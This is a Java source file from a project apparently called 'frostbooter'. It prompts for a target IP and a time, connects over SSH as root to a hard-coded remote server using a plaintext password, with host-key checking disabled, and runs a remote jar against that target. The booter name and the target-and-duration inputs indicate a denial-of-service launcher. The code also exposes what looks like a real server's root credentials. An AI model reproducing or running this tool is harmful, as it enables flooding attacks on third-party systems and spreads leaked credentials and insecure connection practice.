package frostbooter;
import java.io.InputStream;

import javax.swing.JOptionPane;

import com.jcraft.jsch.Channel;
import com.jcraft.jsch.ChannelExec;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.Session;

public class TacoNator {	 
	 
	 
	    /**
	     * @param args
	     */
	    public static void main(String[] args) {
	        String host="104.131.66.134";
	        String user="root";
	        String password="mamamm12";
	        DaTacoMood.main(null);
	        String ip = JOptionPane.showInputDialog("input ip");
	        String time = JOptionPane.showInputDialog("input time");
	        try{
	             
	            java.util.Properties config = new java.util.Properties();
	            config.put("StrictHostKeyChecking", "no");
	            JSch jsch = new JSch();
	            Session session=jsch.getSession(user, host, 22);
	            session.setPassword(password);
	            session.setConfig(config);
	            session.connect();
	            System.out.println("Connected");
	             
	            Channel channel=session.openChannel("exec");
	            ((ChannelExec)channel).setCommand("java -jar rofl/test.jar " + ip + " " + time);
	            channel.setInputStream(null);
	            ((ChannelExec)channel).setErrStream(System.err);
	             
	            InputStream in=channel.getInputStream();
	            channel.connect();
	            byte[] tmp=new byte[1024];
	            while(true){
	              while(in.available()>0){
	                int i=in.read(tmp, 0, 1024);
	                if(i<0)break;
	                System.out.print(new String(tmp, 0, i));
	              }
	              if(channel.isClosed()){
	                System.out.println("exit-status: "+channel.getExitStatus());
	                break;
	              }
	              try{Thread.sleep(1000);}catch(Exception ee){}
	            }
	            channel.disconnect();
	            session.disconnect();
	            System.out.println("DONE");
	        }catch(Exception e){
	            e.printStackTrace();
	        }
	 
	    }
	 
	}
